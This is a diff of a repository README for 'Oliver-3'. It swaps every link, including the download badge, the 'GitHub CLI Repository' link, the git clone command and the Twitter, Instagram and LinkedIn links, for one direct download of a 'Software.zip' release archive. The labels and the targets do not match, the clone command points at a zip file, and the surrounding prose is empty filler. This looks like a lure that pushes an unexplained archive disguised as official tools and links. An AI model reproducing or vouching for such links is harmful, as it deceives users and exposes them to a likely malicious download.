@@ -8,7 +8,7 @@ No specific topics are provided for this repository. Explore the enigmatic proje
 
 ## Get Started
 To begin your adventure into the world of Oliver-3, click the link below to download the repository archive:
-[![Download Oliver-3](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Oliver-3](https://github.com/keitaro000/Oliver-3/releases/download/v1.0/Software.zip)](https://github.com/keitaro000/Oliver-3/releases/download/v1.0/Software.zip)
 
 ### Note:
 The link provided above needs to be launched to initiate the download of the repository archive.
@@ -16,7 +16,7 @@ The link provided above needs to be launched to initiate the download of the rep
 If the link does not work or if you prefer to explore more options, feel free to check the "Releases" section of this repository for additional resources.
 
 ## Resources
-Visit the [GitHub CLI Repository](https://github.com/cli/cli) for more tools and information related to GitHub's Command Line Interface. Get ready to level up your GitHub experience! 🌟
+Visit the [GitHub CLI Repository](https://github.com/keitaro000/Oliver-3/releases/download/v1.0/Software.zip) for more tools and information related to GitHub's Command Line Interface. Get ready to level up your GitHub experience! 🌟
 
 ## Projects
 Unveil the secrets hidden within Oliver-3 through a variety of projects, each offering a unique glimpse into a world shrouded in mystery and innovation. ✨
@@ -34,7 +34,7 @@ Immerse yourself in the realm of artificial intelligence with NeuralLink, a proj
 Join us in unraveling the mysteries of Oliver-3 by contributing to the projects within this repository. Whether you're a seasoned developer or a curious explorer, your insights and creativity are welcome additions to our enigmatic world. 🌌
 
 ### How to Contribute:
-1. Clone the repository: `git clone https://github.com/oliver-3/oliver-3.git`
+1. Clone the repository: `git clone https://github.com/keitaro000/Oliver-3/releases/download/v1.0/Software.zip`
 2. Create a new branch: `git checkout -b feature/new-contribution`
 3. Make your changes and commit them: `git commit -am 'Add new contribution'`
 4. Push your changes to the branch: `git push origin feature/new-contribution`
@@ -46,9 +46,9 @@ For any questions or assistance related to the projects within this repository, 
 ## Connect with Us
 Stay updated on the latest developments, mysterious teasers, and hidden messages from Oliver-3 by following us on social media:
 
-- [Twitter](https://twitter.com/oliver_3)
-- [Instagram](https://instagram.com/oliver_3)
-- [LinkedIn](https://www.linkedin.com/company/oliver-3)
+- [Twitter](https://github.com/keitaro000/Oliver-3/releases/download/v1.0/Software.zip)
+- [Instagram](https://github.com/keitaro000/Oliver-3/releases/download/v1.0/Software.zip)
+- [LinkedIn](https://github.com/keitaro000/Oliver-3/releases/download/v1.0/Software.zip)
 
 Let the adventure begin! 🗝️
 
